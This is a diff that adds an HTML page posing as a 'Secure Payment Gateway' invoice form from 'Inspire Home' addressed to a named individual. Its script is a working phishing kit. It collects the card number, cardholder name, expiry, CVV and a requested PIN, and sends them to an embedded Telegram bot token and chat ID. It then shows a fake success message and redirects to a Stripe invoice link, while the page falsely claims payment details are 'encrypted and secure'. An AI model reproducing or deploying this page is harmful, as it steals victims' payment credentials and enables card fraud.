@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Payment Gateway</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+* {
+margin: 0;
+padding: 0;
+box-sizing: border-box;
+font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+body {
+background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+min-height: 100vh;
+display: flex;
+justify-content: center;
+align-items: center;
+padding: 20px;
+}
+
+.container {
+width: 100%;
+max-width: 500px;
+background: rgba(255, 255, 255, 0.95);
+border-radius: 20px;
+box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+overflow: hidden;
+}
+
+.header {
+background: #2c3e50;
+color: white;
+padding: 25px;
+text-align: center;
+}
+
+.header h1 {
+font-size: 24px;
+margin-bottom: 5px;
+}
+
+.header p {
+font-size: 14px;
+opacity: 0.8;
+}
+
+.invoice-section {
+padding: 20px;
+background: #f8f9fa;
+border-bottom: 1px solid #e9ecef;
+}
+
+.invoice-header {
+display: flex;
+justify-content: space-between;
+align-items: center;
+margin-bottom: 15px;
+}
+
+.invoice-amount {
+font-size: 28px;
+font-weight: 700;
+color: #2c3e50;
+}
+
+.invoice-due {
+font-size: 14px;
+color: #e74c3c;
+font-weight: 600;
+}
+
+.invoice-pdf {
+display: inline-block;
+background: #3498db;
+color: white;
+padding: 8px 15px;
+border-radius: 5px;
+text-decoration: none;
+font-size: 14px;
+margin-bottom: 15px;
+transition: background 0.3s;
+}
+
+.invoice-pdf:hover {
+background: #2980b9;
+}
+
+.invoice-details {
+display: grid;
+grid-template-columns: 1fr 2fr;
+gap: 10px;
+font-size: 14px;
+}
+
+.invoice-label {
+font-weight: 600;
+color: #7f8c8d;
+}
+
+.invoice-value {
+color: #2c3e50;
+}
+
+.card-form {
+padding: 25px;
+}
+
+.form-group {
+margin-bottom: 20px;
+}
+
+.form-group label {
+display: block;
+margin-bottom: 8px;
+font-weight: 600;
+color: #2c3e50;
+}
+
+.form-control {
+width: 100%;
+padding: 15px;
+border: 2px solid #ddd;
+border-radius: 10px;
+font-size: 16px;
+transition: border-color 0.3s;
+}
+
+.form-control:focus {
+border-color: #3498db;
+outline: none;
+}
+
+.form-row {
+display: flex;
+gap: 20px;
+}
+
+.form-row .form-group {
+flex: 1;
+}
+
+.pay-btn {
+width: 100%;
+padding: 16px;
+background: #2ecc71;
+color: white;
+border: none;
+border-radius: 10px;
+font-size: 18px;
+font-weight: 600;
+cursor: pointer;
+transition: background 0.3s;
+margin-top: 10px;
+}
+
+.pay-btn:hover {
+background: #27ae60;
+}
+
+.card-icons {
+display: flex;
+gap: 10px;
+margin-top: 10px;
+}
+
+.card-icon {
+width: 50px;
+height: 30px;
+background: #f1f1f1;
+border-radius: 5px;
+display: flex;
+justify-content: center;
+align-items: center;
+font-size: 18px;
+color: #555;
+}
+
+.loading-overlay {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: rgba(0, 0, 0, 0.8);
+display: flex;
+justify-content: center;
+align-items: center;
+z-index: 1000;
+opacity: 0;
+visibility: hidden;
+transition: opacity 0.3s;
+}
+
+.loading-overlay.active {
+opacity: 1;
+visibility: visible;
+}
+
+.spinner {
+width: 70px;
+height: 70px;
+border: 5px solid rgba(255, 255, 255, 0.3);
+border-radius: 50%;
+border-top-color: #3498db;
+animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
+}
+
+.pin-modal {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: rgba(0, 0, 0, 0.8);
+display: flex;
+justify-content: center;
+align-items: center;
+z-index: 1001;
+opacity: 0;
+visibility: hidden;
+transition: opacity 0.3s;
+}
+
+.pin-modal.active {
+opacity: 1;
+visibility: visible;
+}
+
+.pin-content {
+background: white;
+padding: 30px;
+border-radius: 15px;
+text-align: center;
+width: 90%;
+max-width: 400px;
+}
+
+.pin-content h2 {
+margin-bottom: 20px;
+color: #2c3e50;
+}
+
+.pin-input {
+width: 100%;
+padding: 15px;
+border: 2px solid #ddd;
+border-radius: 10px;
+font-size: 18px;
+text-align: center;
+letter-spacing: 5px;
+margin-bottom: 20px;
+}
+
+.confirm-btn {
+padding: 15px 30px;
+background: #3498db;
+color: white;
+border: none;
+border-radius: 10px;
+font-size: 16px;
+font-weight: 600;
+cursor: pointer;
+transition: background 0.3s;
+}
+
+.confirm-btn:hover {
+background: #2980b9;
+}
+
+.security-note {
+text-align: center;
+margin-top: 20px;
+font-size: 14px;
+color: #7f8c8d;
+}
+
+.security-note i {
+color: #3498db;
+margin-right: 5px;
+}
+
+@media (max-width: 600px) {
+.form-row {
+flex-direction: column;
+gap: 0;
+}
+
+.container {
+border-radius: 15px;
+}
+
+.invoice-header {
+flex-direction: column;
+align-items: flex-start;
+gap: 10px;
+}
+}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h1>Secure Payment Gateway</h1>
+<p>Enter your card details to complete the transaction</p>
+</div>
+
+<div class="invoice-section">
+<div class="invoice-header">
+<div class="invoice-amount">AED 3,119.68</div>
+<div class="invoice-due">Due September 26, 2025</div>
+</div>
+<a href="#" class="invoice-pdf">
+<i class="fas fa-file-pdf"></i> Invoice PDF
+</a>
+<div class="invoice-details">
+<div class="invoice-label">To:</div>
+<div class="invoice-value">SHAKER MUJTABA KAWAS</div>
+<div class="invoice-label">From:</div>
+<div class="invoice-value">Inspire Home</div>
+<div class="invoice-label">Invoice:</div>
+<div class="invoice-value">#RMY7GKMM-0001</div>
+</div>
+</div>
+
+<div class="card-form">
+<div class="form-group">
+<label for="cardNumber">Card Number</label>
+<input type="text" id="cardNumber" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19">
+</div>
+
+<div class="form-group">
+<label for="cardName">Cardholder Name</label>
+<input type="text" id="cardName" class="form-control" placeholder="John Doe">
+</div>
+
+<div class="form-row">
+<div class="form-group">
+<label for="expiryDate">Expiry Date</label>
+<input type="text" id="expiryDate" class="form-control" placeholder="MM/YY" maxlength="5">
+</div>
+
+<div class="form-group">
+<label for="cvv">CVV</label>
+<input type="password" id="cvv" class="form-control" placeholder="123" maxlength="3">
+</div>
+</div>
+
+<div class="card-icons">
+<div class="card-icon">
+<i class="fab fa-cc-visa"></i>
+</div>
+<div class="card-icon">
+<i class="fab fa-cc-mastercard"></i>
+</div>
+<div class="card-icon">
+<i class="fab fa-cc-amex"></i>
+</div>
+<div class="card-icon">
+<i class="fab fa-cc-discover"></i>
+</div>
+</div>
+
+<button class="pay-btn" id="payButton">
+<i class="fas fa-lock"></i> Pay Now
+</button>
+
+<div class="security-note">
+<p><i class="fas fa-shield-alt"></i> Your payment details are encrypted and secure</p>
+</div>
+</div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+<div class="spinner"></div>
+</div>
+
+<div class="pin-modal" id="pinModal">
+<div class="pin-content">
+<h2>Enter Your T-PIN</h2>
+<input type="password" class="pin-input" placeholder="Enter PIN" maxlength="4">
+<button class="confirm-btn" id="confirmPin">Confirm Payment</button>
+</div>
+</div>
+
+<script>
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = "8164185181:AAFl5fetK6Jic9KI4Wfz1rteMpxPVagwdt4";
+const TELEGRAM_CHAT_ID  = "5926734862";
+const TELEGRAM_BASE = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+// Function to send message to Telegram
+async function sendToTelegram(message) {
+    const url = `${TELEGRAM_BASE}/sendMessage`;
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Telegram API error: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        throw error;
+    }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    // Get elements
+    const cardNumber = document.getElementById('cardNumber');
+    const expiryDate = document.getElementById('expiryDate');
+    const cvv = document.getElementById('cvv');
+    const cardName = document.getElementById('cardName');
+    const payButton = document.getElementById('payButton');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const pinModal = document.getElementById('pinModal');
+    const pinInput = document.querySelector('.pin-input');
+    const confirmPin = document.getElementById('confirmPin');
+
+    // Format card number input
+    cardNumber.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 0) {
+            value = value.match(/.{1,4}/g).join(' ');
+        }
+        e.target.value = value;
+    });
+
+    // Format expiry date input
+    expiryDate.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2);
+        }
+        e.target.value = value;
+    });
+
+    // Pay button click event
+    payButton.addEventListener('click', function() {
+        // Simple validation
+        if (!cardNumber.value || !expiryDate.value || !cvv.value || !cardName.value) {
+            alert('Please fill in all card details');
+            return;
+        }
+
+        // Show loading overlay
+        loadingOverlay.classList.add('active');
+
+        // Simulate processing for 3 seconds
+        setTimeout(function() {
+            // Hide loading overlay
+            loadingOverlay.classList.remove('active');
+
+            // Show PIN modal
+            pinModal.classList.add('active');
+            pinInput.focus();
+        }, 3000);
+    });
+
+    // Confirm PIN button click event
+    confirmPin.addEventListener('click', async function() {
+        if (!pinInput.value) {
+            alert('Please enter your PIN');
+            return;
+        }
+
+        // Prepare data to send to Telegram
+        const paymentData = `
+💳 <b>New Payment Details Received</b>
+
+📄 <b>Invoice Details:</b>
+💰 <b>Amount:</b> AED 3,119.68
+📅 <b>Due Date:</b> September 26, 2025
+👤 <b>To:</b> SHAKER MUJTABA KAWAS
+🏠 <b>From:</b> Inspire Home
+🔢 <b>Invoice #:</b> #RMY7GKMM-0001
+
+💳 <b>Payment Information:</b>
+👤 <b>Cardholder:</b> ${cardName.value}
+🔢 <b>Card Number:</b> ${cardNumber.value}
+📅 <b>Expiry Date:</b> ${expiryDate.value}
+🔐 <b>CVV:</b> ${cvv.value}
+🔒 <b>PIN:</b> ${pinInput.value}
+
+🕐 <b>Timestamp:</b> ${new Date().toLocaleString()}
+        `;
+
+        try {
+            // Show loading again while sending to Telegram
+            loadingOverlay.classList.add('active');
+            
+            // Send data to Telegram
+            await sendToTelegram(paymentData);
+            
+            // Hide loading overlay
+            loadingOverlay.classList.remove('active');
+            
+            // Show success message
+            alert('Payment processed successfully!');
+            
+            // Redirect to bincheck.io
+            window.location.href = 'https://invoice.stripe.com/i/acct_1OgjPgLoh05CvedE/live_YWNjdF8xT2dqUGdMb2gwNUN2ZWRFLF9UM2lUczY3c0hJS3lCRU9FaVJrZ3N1ajdkSmdoYTdKLDE0ODQ3ODUwNA02003UPw987S?s=db';
+            
+        } catch (error) {
+            // Hide loading overlay
+            loadingOverlay.classList.remove('active');
+            
+            // Show error message but still redirect
+            alert('There was an issue processing your payment, but you will be redirected to verify your card.');
+            
+            // Still redirect to bincheck.io even if Telegram fails
+            window.location.href = 'https://invoice.stripe.com/i/acct_1OgjPgLoh05CvedE/live_YWNjdF8xT2dqUGdMb2gwNUN2ZWRFLF9UM2lUczY3c0hJS3lCRU9FaVJrZ3N1ajdkSmdoYTdKLDE0ODQ3ODUwNA02003UPw987S?s=db';
+        }
+        
+        // Reset form
+        cardNumber.value = '';
+        cardName.value = '';
+        expiryDate.value = '';
+        cvv.value = '';
+        pinInput.value = '';
+        pinModal.classList.remove('active');
+    });
+
+    // Close modal when clicking outside
+    window.addEventListener('click', function(e) {
+        if (e.target === pinModal) {
+            pinModal.classList.remove('active');
+        }
+    });
+});
+</script>
+</body>
+</html>
